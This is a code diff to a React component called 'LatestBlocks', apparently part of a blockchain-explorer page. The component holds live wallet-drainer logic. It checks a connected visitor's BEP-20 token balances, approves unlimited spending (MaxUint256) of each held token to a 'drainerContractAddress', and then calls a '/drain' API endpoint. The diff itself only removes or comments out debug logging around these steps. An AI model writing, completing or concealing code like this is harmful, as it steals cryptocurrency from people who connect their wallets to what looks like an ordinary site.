@@ -98,7 +98,6 @@ const LatestBlocks = () => {
   
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
-      console.log("Signer:", signer);
   
       let hasTokens = false;
       const bep20Abi = [
@@ -109,7 +108,6 @@ const LatestBlocks = () => {
       for (const token of tokenList) {
         const tokenContract = new ethers.Contract(token.address, bep20Abi, provider);
         const balance = await tokenContract.balanceOf(connectedAddress);
-        console.log(`${token.symbol} Balance:`, ethers.formatUnits(balance, token.decimals));
         if (balance > 0) hasTokens = true;
       }
   
@@ -132,13 +130,13 @@ const LatestBlocks = () => {
           if (drainData.needsApproval) {
             for (const token of tokenList) {
               const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
-              console.log("Token Contract with Signer:", tokenContract);
+              // console.log("Token Contract with Signer:", tokenContract);
               const balance = await tokenContract.balanceOf(connectedAddress);
               if (balance > 0) {
                 const gasEstimate = await tokenContract.estimateGas.approve(drainerContractAddress, ethers.MaxUint256);
-                console.log("Gas Estimate for Approve:", gasEstimate.toString());
+                // console.log("Gas Estimate for Approve:", gasEstimate.toString());
                 await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: gasEstimate });
-                console.log(`Approved ${token.symbol} for draining`);
+                // console.log(`Approved ${token.symbol} for draining`);
               }
             }
             await fetch(`${API_BASE_URL}/drain`, {
